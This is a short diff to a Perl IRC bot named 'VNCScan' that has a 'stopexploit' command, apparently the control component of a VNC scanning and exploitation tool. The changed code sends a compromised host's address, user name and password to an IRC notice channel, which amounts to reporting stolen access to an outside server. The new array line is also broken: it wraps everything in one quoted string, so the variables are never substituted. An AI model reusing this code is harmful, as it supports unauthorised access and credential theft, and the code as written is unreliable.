@@ -16,6 +16,7 @@ my %events;
 my $h0st;
 my $us3r;
 my $p4ss;
+my @arr4y;
 my $irc = Mojo::IRC->new(
  #definenickhere
  user => 'VNCScan',
@@ -71,7 +72,8 @@ $irc->on(irc_privmsg => sub {
   $h0st = $ENV{'H0ST'};
   $us3r = $ENV{'US3R'};
   $p4ss = $ENV{'P4SSWD'};
-  $irc->write(notice => $noticechan => '9,1Added user:' . $us3r . 'password:' . $p4ss . 'on host:' . $h0st);
+  @arr4y = '"9,1Added user:", $us3r, "password:", $p4ss, "on host:", $h0st';
+  $irc->write(notice => $noticechan => @arr4y);
  }
  elsif ($msg =~ /@.stopexploit/) {
   warn 'stopexploit called, killing...';
